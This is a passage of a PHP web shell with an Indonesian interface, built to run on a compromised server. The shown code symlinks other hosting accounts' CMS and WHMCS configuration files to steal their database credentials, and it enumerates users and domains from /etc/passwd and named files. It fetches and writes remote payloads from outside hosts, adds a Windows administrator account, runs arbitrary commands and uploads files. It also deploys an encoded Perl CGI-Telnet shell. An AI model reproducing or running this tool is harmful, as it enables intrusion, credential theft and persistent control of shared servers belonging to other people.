    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/Settings.php', 'pee/' . $etcc[0] . '-SMF.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/sites/default/settings.php', 'pee/' . $etcc[0] . '-Drupal.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/e107_config.php', 'pee/' . $etcc[0] . '-e107.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/datas/config.php', 'pee/' . $etcc[0] . '-Seditio.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/includes/configure.php', 'pee/' . $etcc[0] . '-osCommerce.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/client/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/clientes/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/support/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/supportes/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/whmcs/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/domain/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/hosting/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/whmc/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/billing/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/portal/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/order/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/clientarea/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
    symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/domains/configuration.php', 'pee/' . $etcc[0] . '-WHMCS.txt');
} if (is_readable('/var/named')) {
    echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
    echo'<tr><td><center><b>SITE</b></center></td><td>
					<center><b>USER</b></center></td>
					<td></center><b>SYMLINK</b></center></td>';
    $list = scandir('/var/named');
    foreach ($list as $domain) {
        if (strpos($domain, '.db')) {
            ++$i;
            $domain = str_replace('.db', '', $domain);
            $owner = posix_getpwuid(fileowner('/etc/valiases/' . $domain));
            echo "<tr><td class='td1'><a href='http://" . $domain . " '>" . $domain . "</a></td>
					<td class='td1'><center><font color='red'>" . $owner['name'] . "</font></center></td>
					<td class='td1'><center><a href='pee/root" . $owner['dir'] . '/' . $dir[3] . "' target='_blank'>DIR</a></center></td>";
        }
    }
    echo '<center>Total Domains Found: ' . $i . '</center><br />';
} else {
    echo "<tr><td class='td1'>can't read [ /var/named ]</td><tr>";
}
// break;
error_reporting(0); $etc = file_get_contents('/etc/passwd'); $etcz = explode("\n", $etc); if (is_readable('/etc/passwd')) {
    echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
    echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';
    $list = scandir('/var/named');
    foreach ($etcz as $etz) {
        $etcc = explode(':', $etz);
        foreach ($list as $domain) {
            if (strpos($domain, '.db')) {
                $domain = str_replace('.db', '', $domain);
                $owner = posix_getpwuid(fileowner('/etc/valiases/' . $domain));
                if ($owner['name'] == $etcc[0]) {
                    ++$i;
                    echo "<tr><td class='td1'><a href='http://" . $domain . " '>" . $domain . "</a></td><center>
				<td class='td1'><font color='red'>" . $owner['name'] . "</font></center></td>
				<td class='td1'><center><a href='pee/root" . $owner['dir'] . '/' . $dir[3] . "' target='_blank'>DIR</a></center></td>";
                }
            }
        }
    }
    echo '<center>Total Domains Found: ' . $i . '</center><br />';
}
// break;
if (is_readable('/etc/named.conf')) {
    echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
    echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
    $named = file_get_contents('/etc/named.conf');
    preg_match_all('%zone \"(.*)\" {%', $named, $domains);
    foreach ($domains[1] as $domain) {
        $domain = trim($domain);
        ++$i;
        $owner = posix_getpwuid(fileowner('/etc/valiases/' . $domain));
        echo "<tr><td class='td1'><a href='http://" . $domain . " '>" . $domain . "</a></td><td class='td1'><center><font color='red'>" . $owner['name'] . "</font></center></td><td class='td1'><center><a href='pee/root" . $owner['dir'] . '/' . $dir[3] . "' target='_blank'>DIR</a></center></td>";
    }
    echo '<center>Total Domains Found: ' . $i . '</center><br />';
} else {
    echo "<tr><td class='td1'>can't read [ /etc/named.conf ]</td></tr>";
}
// break;
if (is_readable('/etc/valiases')) {
    echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
    echo'<tr><td><center><b>SITE</b></center></td><td>
				<center><b>USER</b></center></td><td></center>
				<b>SYMLINK</b></center></td>';
    $list = scandir('/etc/valiases');
    foreach ($list as $domain) {
        ++$i;
        $owner = posix_getpwuid(fileowner('/etc/valiases/' . $domain));
        echo "<tr><td class='td1'><a href='http://" . $domain . " '>" . $domain . "</a></td>
				<center><td class='td1'><font color='red'>" . $owner['name'] . "</font></center></td>
				<td class='td1'><center><a href='pee/root" . $owner['dir'] . '/' . $dir[3] . "' target='_blank'>DIR</a></center></td>";
    }
    echo '<center>Total Domains Found: ' . $i . '</center><br />';
} else {
    echo "<tr><td class='td1'>can't read [ /etc/valiases ]</td></tr>";
}
// break;
} elseif (isset($_GET['x']) && ('dump' == $_GET['x'])) { ?>
				<br/><br/>
				<form action="?path=<?php echo $path; ?>&amp;x=dump" method="post">
				<?php  $pilih = $_POST['pilihan']; echo'<center>
				<table border=1>
				<select class="bordergaya" align="left"  name="pilihan" id="pilih">
				<option value="dumper">Gate 1</option>
				</select>
				<input  type="submit" name="submites" class="bordergaya" value="Click here for Dump Email">'; ?><?php  if ('dumper' == $pilih) {
    $files = file_get_contents('http://base64.asia/txt/etc.txt');
    file_put_contents('dumper.php', $files);
    echo "<script>alert('Done! Access dumper.php for processing'); hideAll();</script>";
    echo '<a href=' . 'dumper.php' . ' target=_blank><br/><br/><b>dumper.php [Click here]</b></a></center>';
    die();
} echo'</td></form></tr></table>';
// break;
} if (isset($_GET['x']) && ('krdp' == $_GET['x'])) {
    if ('WIN' === strtoupper(substr(PHP_OS, 0, 3))) { ?><br/><br/>
						<div id="content-left">
								<form action="" method="post">
								<table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
									<tr>
										<td colspan="3" align="center" bgcolor="#2d2b2b"><font face="Fredericka the Great" size="2px" color="white">CREATE RDP</font></td>
									</tr>
									<tr>
										<td><font class='kecew'>Username</font></td>
										<td><font class='kecew'> : </font></td>
										<td><input type="text" class="bordergaya" name="username" required></td>
									</tr>
									<tr>
										<td><font class='kecew'>Password</font></td>
										<td><font class='kecew'> : </font></td>
										<td><input type="text" class="bordergaya" name="password" required></td>
									</tr>
									<tr>
										<td colspan="3" align="center"><input type="hidden" name="kshell" value="1"><input type="submit" name="submit" class="bordergaya" value="Create"></td>
									</tr>
								</table>
								</form>
								</div>
								<br/>
								<div id="content-left">
								<form action="" method="post">
									<table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
										<tr>
											<td colspan="3" align="center" bgcolor="#2d2b2b"><font face="Fredericka the Great" size="2px" color="white">OPTION</td>
										</tr>
										<tr>
											<td><font class='kecew'>Username</font></td>
											<td><font class='kecew'> : </font></td>
											<td><input type="text" name="rusername" placeholder="Masukan Username" class="bordergaya"></td>
										</tr>
										<tr>
											<td><font class='kecew'>Password</font></td>
											<td><font class='kecew'> : </font></td>
											<td><input type="text" name="gantipw" placeholder="Password Baru" class="bordergaya"></td>
										</tr>
										<tr>
											<td><font class='kecew'>Action</font></td>
											<td><font class='kecew'> : </font></td>
											<td>
												<select name="aksi" class="bordergaya">
														<option value="1">Tampilkan Username</option>
														<option value="2">Hapus Username</option>
														<option value="3">Ubah Password</option>
												</select>
											</td>
										</tr>
										<tr>
											<td colspan="3" align="center"><input type="hidden" name="kshell" value="2"><input type="submit" name="submit" class="bordergaya" value="Execute"></td>
										</tr>
									</table>
								</form>
								<br/>
						</div>
						</center></center>
					<?php  if ($_POST['submit']) {
        if ('1' == $_POST['kshell']) {
            $r_user = $_POST['username'];
            $r_pass = $_POST['password'];
            $cmd_cek_user = shell_exec('net user');
            if (preg_match("/$r_user/", $cmd_cek_user)) {
                echo $gaya_root . $r_user . ' sudah ada' . $o;
            } else {
                $cmd_add_user = shell_exec('net user ' . $r_user . ' ' . $r_pass . ' /add');
                $cmd_add_groups1 = shell_exec('net localgroup Administrators ' . $r_user . ' /add');
                $cmd_add_groups2 = shell_exec('net localgroup Administrator ' . $r_user . ' /add');
                $cmd_add_groups3 = shell_exec('net localgroup Administrateur ' . $r_user . ' /add');
                if ($cmd_add_user) {
                    echo $gaya_root . "<font class='rapihbanget'>[+] Menambahkan User : " . $r_user . ' Password : ' . $r_pass . " <font color='greenyellow'>Berhasil!</font></font><br/><br/>" . $o;
                } else {
                    echo $gaya_root . "<font class='rapihbanget'>[+] Menambahkan User : " . $r_user . ' Password : ' . $r_pass . " <font color='red'>Gagal!</font><br/><br/>" . $o;
                }
                echo "<font class='rapihbanget'>[+] Sedang Memroses User.. Silahkan Tunggu Sebentar..  <br/>";
                if ($cmd_add_groups1) {
                    echo $gaya_root . "<font class='rapihbanget'>--- Selamat! User " . $r_user . " <font color='greenyellow'>Berhasil Di Proses!</font><br/><br/>" . $o;
                } elseif ($cmd_add_groups2) {
                    echo $gaya_root . "<font class='rapihbanget'>--- Selamat! User " . $r_user . " <font color='greenyellow'>Berhasil Di Proses!</font><br/><br/>" . $o;
                } elseif ($cmd_add_groups3) {
                    echo $gaya_root . "<font class='rapihbanget'>--- Selamat! User " . $r_user . " <font color='greenyellow'>Berhasil Di Proses!</font><br/><br/>" . $o;
                } else {
                    echo $gaya_root . "<font class='rapihbanget'>--- Maaf User " . $r_user . " <font color='red'>Gagal Di Proses!</font><br/><br/>" . $o;
                }
                echo "<font class='rapihbanget'>[+] Server Info : </font><br/>";
                echo $gaya_root . "<font class='rapihbanget'>--- ServerIP : " . $_SERVER['HTTP_HOST'] . "</font><br/><font class='rapihbanget'>--- Username  : " . $r_user . "</font><br/><font class='rapihbanget'>--- Password  : </font>" . $r_pass . $o . '</font><br/><br/>';
                echo "<font class='rapihbanget'>[+] Thank For Using It ~_^ </font><br/><br/>";
            }
        } elseif ('2' == $_POST['kshell']) {
            echo '<style>
									.coeg{margin-left:30%;}
									</style>';
            if ('1' == $_POST['aksi']) {
                echo "<pre class='coeg'>" . shell_exec('net user');
            } elseif ('2' == $_POST['aksi']) {
                $username = $_POST['rusername'];
                $cmd_cek_user = shell_exec('net user');
                if (!empty($username)) {
                    if (preg_match("/$username/", $cmd_cek_user)) {
                        $cmd_add_user = shell_exec('net user ' . $username . ' /DELETE');
                        if ($cmd_add_user) {
                            echo "<font class='rapihbanget'>[+] Sedang Memroses.. Silahkan Tunggu..  </font><br /><br />";
                            echo $gaya_root . "<font class='rapihbanget'>[+] Selamat! Remove User  </font><font color='orange'>" . $username . " </font><font color='greenyellow'>Berhasil!!</font><br /><br />" . $o;
                        } else {
                            echo $gaya_root . "<font class='rapihbanget'>[+] Yah :( Remove User  </font><font color='orange'>" . $username . " </font><font color='red'>Gagal!!</font><br /><br />" . $o;
                        }
                    } else {
                        echo $gaya_root . "<font class='rapihbanget'>Are You Kidding Me?! Username : </font><font color='orange'>" . $username . " </font><font color='red'> Itu Enggak Ada!!</font><br /><br />" . $o;
                    }
                } else {
                    echo $gaya_root . "<font class='rapihbanget'> Silahkan Masukkan Dahulu Username Yang Mau Di Hapus!! </font><br /><br />" . $o;
                }
            } elseif ('3' == $_POST['aksi']) {
                echo '<style>
										.tengahaja{margin-left:35%}
									  </style>';
                $username = $_POST['rusername'];
                $password = $_POST['gantipw'];
                $cmd_cek_user = shell_exec('net user');
                if (!empty($username)) {
                    if (preg_match("/$username/", $cmd_cek_user)) {
                        $cmd_add_user = shell_exec('net user ' . $username . '');
                        if ($cmd_add_user) {
                            echo $gaya_root . "<font class='tengahaja'>Ganti Password Username : " . $username . ' dan Password : ' . $password . " <font color='greenyellow'>Berhasil!!</font><br /><br />" . $o;
                        } else {
                            echo $gaya_root . "<font class='tengahaja'>Ganti Password Username : " . $username . ' dan Password : ' . $password . " <font color='red'>Gagal!!</font><br /><br />" . $o;
                        }
                    } else {
                        echo $gaya_root . "<font class='rapihbanget'>Are You Kidding Me?! Username : </font><font color='orange'>" . $username . " </font><font color='red'> Itu Enggak Ada!!</font><br /><br />" . $o;
                    }
                } else {
                    echo $gaya_root . "<font class='rapihbanget'> Silahkan Masukkan Dahulu Username Yang Mau Di Hapus!! </font><br /><br />" . $o;
                }
            }
        }
    } } else {
        echo "<br><br><font color='springgreen' face='Fredericka The Great'>TOOLS GAK BISA DI PAKE NDAN -_- SERVERNYA BUKAN WINDOWS</font>";
    }
    // break;
} elseif (isset($_GET['x']) && ('fcrot' == $_GET['x'])) {
    echo'<center><br><br><h3>Adminer</h3>
				<table>
				<tr><form method="post" action="">&nbsp;<td>
				<select class="bordergaya" align="left"  name="pilihan" id="pilih">
				<option value="adminer">Adminer</option>
				</select>
				<input  type="submit" name="submites" class="bordergaya" value="create">
				</td></form></tr></table>';
    error_reporting(0);
    set_time_limit(0);
    $submit = $_POST['submites'];
    if (isset($submit)) {
        $pilih = $_POST['pilihan'];
        if ('hsphere' == $pilih) {
            $files = file_get_contents('https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/sc0hsphere.php');
            file_put_contents('hsphere.php', $files);
            echo "<script>alert('Bypass hsphere shell created!'); hideAll();</script>";
            echo '<a href=' . 'hsphere.php' . ' target=_blank><b>hsphere.php [Click here]</b></a></center>';
            die();
        } elseif ('adminer' == $pilih) {
            getfile('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php', 'adminer.php');
            echo "<script>alert('adminer created!'); hideAll();</script>";
            echo '<a href=' . 'adminer.php' . ' target=_blank><b>adminer.php [Click here]</b></a></center>';
            die();
        }
    }
    // break;
} elseif (isset($_GET['x']) && ('korong' == $_GET['x'])) {
    echo '<center><br /><br />
						<form enctype="multipart/form-data" method="POST">
							<input type="file" name="file" id="file" class="inputfile inputfile-4" />
							<label for="file">
								<figure>
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="17" viewBox="0 0 20 17"><path d="M10 0l-5.2 4.9h3.3v5.1h3.8v-5.1h3.3l-5.2-4.9zm9.3 11.5l-3.2-2.1h-2l3.4 2.6h-3.5c-.1 0-.2.1-.2.1l-.8 2.3h-6l-.8-2.2c-.1-.1-.1-.2-.2-.2h-3.6l3.4-2.6h-2l-3.2 2.1c-.4.3-.7 1-.6 1.5l.6 3.1c.1.5.7.9 1.2.9h16.3c.6 0 1.1-.4 1.3-.9l.6-3.1c.1-.5-.2-1.2-.7-1.5z"/></svg>
								</figure>
								<span>Silahkan Pilih File</span>
							</label>'; ?>
							<script type="text/javascript">
									/*
										By Osvaldas Valutis, www.osvaldas.info
										Available for use under the MIT License
									*/

									'use strict';

									;( function ( document, window, index )
									{
										var inputs = document.querySelectorAll( '.inputfile' );
										Array.prototype.forEach.call( inputs, function( input )
										{
											var label	 = input.nextElementSibling,
												labelVal = label.innerHTML;

											input.addEventListener( 'change', function( e )
											{
												var fileName = '';
												if( this.files && this.files.length > 1 )
													fileName = ( this.getAttribute( 'data-multiple-caption' ) || '' ).replace( '{count}', this.files.length );
												else
													fileName = e.target.value.split( '\\' ).pop();

												if( fileName )
													label.querySelector( 'span' ).innerHTML = fileName;
												else
													label.innerHTML = labelVal;
											});

											// Firefox bug fix
											input.addEventListener( 'focus', function(){ input.classList.add( 'has-focus' ); });
											input.addEventListener( 'blur', function(){ input.classList.remove( 'has-focus' ); });
										});
									}( document, window, 0 ));
							</script>
							<?php  echo'<br/>
							<input type="submit" class="tombolupil" value="Upload File!" />
						</form>';
    if (isset($_FILES['file'])) {
        if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
            echo '<script>alert("File Sukses Di Upload!");</script>';
        } else {
            echo '<script>alert("File Gagal Di Upload!");</script>';
        }
    }
    echo '</center><br /><br />';
// break;
} elseif (isset($_GET['x']) && ('cmd' == $_GET['x'])) {
    echo "<br/><br/><form method='post'>
				<font clss='rapihbanget'>Command :</font>
				<input class='bordergaya' type='text' size='30' height='10' name='cmd'><input type='submit' class='bordergaya' name='execmd' value=' Execute '>
				</form>";
    if ($_POST['execmd']) {
        echo '<pre>' . exe($_POST['cmd']) . '</pre>';
    }
} elseif (isset($_GET['x']) && ('bypstuls' == $_GET['x'])) {
    echo '<br/><br/>Bypass Tools<br/><br/>'; ?>
					<a href="?<?php echo 'path=' . $path; ?>&amp;x=bysysfuncwsf"><input class=bordergaya type=submit value="Litespeed Bypass" /></a>
					Or <a href="?<?php echo 'path=' . $path; ?>&amp;x=bypsini"><input class=bordergaya type=submit value="Forbidden Bypass" /></a>
					Or <a href="?<?php echo 'path=' . $path; ?>&amp;x=bysysfuncwexec"><input class=bordergaya type=submit value="Safe Mode Bypass" /></a>
					<br/><br/><br/><br/>
					<?php
} elseif (isset($_GET['x']) && ('bysysfuncwsf' == $_GET['x'])) {
        echo '<br><center><span style="font-size:20px; font-family:Fredericka the Great; color:orange">Litespeed Bypass</span><center>';
        mkdir('bypass-1', 0755);
        chdir('bypass-1');
        $bysyswsf = file_get_contents('http://base64.asia/txt/r00t.txt');
        $file = fopen('bypass-1.php', 'w+');
        $write = fwrite($file, $bysyswsf);
        fclose($file);
        chmod('bypass-1.php', 0755);
        echo '<a href=' . 'bypass-1/bypass-1.php' . ' target=_blank><br/><br/><b>Bypass.php [Click here]</b></a></center>';
    } elseif (isset($_GET['x']) && ('bypsini' == $_GET['x'])) {
        echo '<br><center><span style="font-size:20px; font-family:Fredericka the Great; color:orange">Forbidden Bypass</span><center>';
        mkdir('bypass-2', 0755);
        chdir('bypass-2');
        $bysyswsf = file_get_contents('http://base64.asia/txt/privbypass.txt');
        $file = fopen('bypass-2.php', 'w+');
        $write = fwrite($file, $bysyswsf);
        fclose($file);
        chmod('bypass-2.php', 0755);
        echo '<a href=' . 'bypass-2/bypass-2.php' . ' target=_blank><br/><br/><b>Bypass.php [Click here]</b></a></center>';
    } elseif (isset($_GET['x']) && ('cgi' == $_GET['x'])) {
        if (!is_dir('cgi')) {
            mkdir('cgi', 0755);
        }
        chdir('cgi');
        $kokdosya = '.htaccess';
        $dosya_adi = "$kokdosya";
        $dosya = fopen($dosya_adi, 'w') or die('Dosya a&#231;&#305;lamad&#305;!');
        $metin = 'Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin';
        fwrite($dosya, $metin);
        fclose($dosya);
        $cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+cjAwdC5pbmZvIC0gQ0dJLVRlbG5ldDwvZm9udD4iOw0KDQokUGFzc3dvcmQgPSAicjAwdC5pbmZveDEiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcw0KCQkJCSMgdG8gbG9naW4uDQpzdWIgSXNfV2luKCl7DQoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOw0KCWlmKCRvcyA9fiBtL3dpbi9pKXsNCgkJcmV0dXJuIDE7DQoJfQ0KCWVsc2V7DQoJCXJldHVybiAwOw0KCX0NCn0NCiRXaW5OVCA9ICZJc19XaW4oKTsJCQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCQkJCQkjIHlvdSdyZSBydW5uaW5nIHRoaXMgc2NyaXB0IG9uIGEgV2luZG93cyBOVA0KCQkJCQkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KCQkJCQkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENtZFNlcCA9ICImIjsJCQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNlcCA9ICI7IjsJCQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwMDAwOwkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxlZA0KCQkJCQkJCQkjIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcw0KCQkJCQkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJCQkJCSMgdGFrZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcw0KCQkJCQkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlDQoJCQkJCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlDQoJCQkJCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCQkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQNCgkJCQkJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQokY29scz0gMTUwOw0KJHJvd3M9IDI2Ow0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0DQojIHBhcnNlcyBHRVQsIFBPU1QgYW5kIG11bHRpcGFydC9mb3JtLWRhdGEgdGhhdCBpcyB1c2VkIGZvciB1cGxvYWRpbmcgZmlsZXMuDQojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uDQojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mDQojIHRoZSB2YXJpYWJsZS4gTm90ZTogTW9zdCBvZiB0aGUgY29kZSBpbiB0aGlzIGZ1bmN0aW9uIGlzIHRha2VuIGZyb20gb3RoZXIgQ0dJDQojIHNjcmlwdHMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUmVhZFBhcnNlIA0Kew0KCWxvY2FsICgqaW4pID0gQF8gaWYgQF87DQoJbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCgkNCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsNCg0KCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQoJew0KCQkkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCgl9DQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQoJew0KCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQoJfQ0KDQoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQ0KCWlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0KCXsNCgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyANCgkJQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsgDQoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07DQoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsNCgkJJEhlYWRlciA9ICRgOw0KCQkkQm9keSA9ICQnOw0KIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQ0KCQkkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyANCgkJJGlueydmJ30gPSAkMTsgDQoJCSRpbnsnZid9ID1+IHMvXCIvL2c7DQoJCSRpbnsnZid9ID1+IHMvXHMvL2c7DQoNCgkJIyBwYXJzZSB0cmFpbGVyDQoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQoJCXsgDQoJCQkkbGlzdFskaV0gPX4gcy9eLituYW1lPSQvLzsNCgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsNCgkJCSRrZXkgPSAkMTsNCgkJCSR2YWwgPSAkJzsNCgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9ID0gJHZhbDsgDQoJCX0NCgl9DQoJZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQoJew0KCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7DQoJCWZvcmVhY2ggJGkgKDAgLi4gJCNpbikNCgkJew0KCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsNCgkJCSgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7DQoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSAuPSAiXDAiIGlmIChkZWZpbmVkKCRpbnska2V5fSkpO